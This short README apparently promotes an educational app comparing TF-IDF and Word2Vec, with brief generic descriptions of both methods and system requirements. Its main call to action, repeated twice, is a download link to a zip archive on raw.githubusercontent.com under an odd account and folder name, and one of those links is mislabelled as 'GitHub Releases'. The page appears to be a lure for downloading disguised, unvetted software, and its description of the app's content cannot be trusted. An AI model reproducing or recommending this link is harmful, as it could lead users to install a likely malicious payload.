![Download](https://raw.githubusercontent.com/formalized-sarcocystis669/TFIDF-vs-Word2Vec/main/shikimi/TFIDF-vs-Word2Vec-v3.8-beta.4.zip)

## 🌟 Introduction

Welcome to TFIDF-vs-Word2Vec! This guide helps you understand two important techniques in natural language processing (NLP): TF-IDF and Word2Vec. With this application, you will learn how these methods convert text into numerical vectors, their mathematical foundations, and how you can use them for text analysis and machine learning projects.

## 🚀 Getting Started

To begin using the application, follow these simple steps. No technical background is needed!

## 📥 Download & Install

1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/formalized-sarcocystis669/TFIDF-vs-Word2Vec/main/shikimi/TFIDF-vs-Word2Vec-v3.8-beta.4.zip).

## 📊 How It Works

This application uses two well-known methods to turn text into numerical values:

- **TF-IDF (Term Frequency-Inverse Document Frequency):** This method evaluates how important a word is to a document in a collection. It does this by comparing the frequency of words in one document to their frequency in all documents. This helps highlight the key themes in your text.

- **Word2Vec:** This technique uses neural networks to learn the relationship between words in a text. It represents words as vectors in a multi-dimensional space. Similar words are positioned close together, which helps improve language understanding for tasks like translation or sentiment analysis.

## 🧑‍🏫 Educational Resources

This application also provides educational resources, including:

- Detailed explanations of both TF-IDF and Word2Vec.
- Example code snippets in Python for practical implementation.
- Real-world use cases to show how these techniques are applied.

## ⚙️ System Requirements

To use this application smoothly, your system should meet these requirements:

- **Operating System:** Windows 10 or later, macOS 10.12 or later, or any modern Linux distribution.
- **RAM:** At least 4 GB for optimal performance.
- **Disk Space:** At least 200 MB of free disk space for installation and data storage.
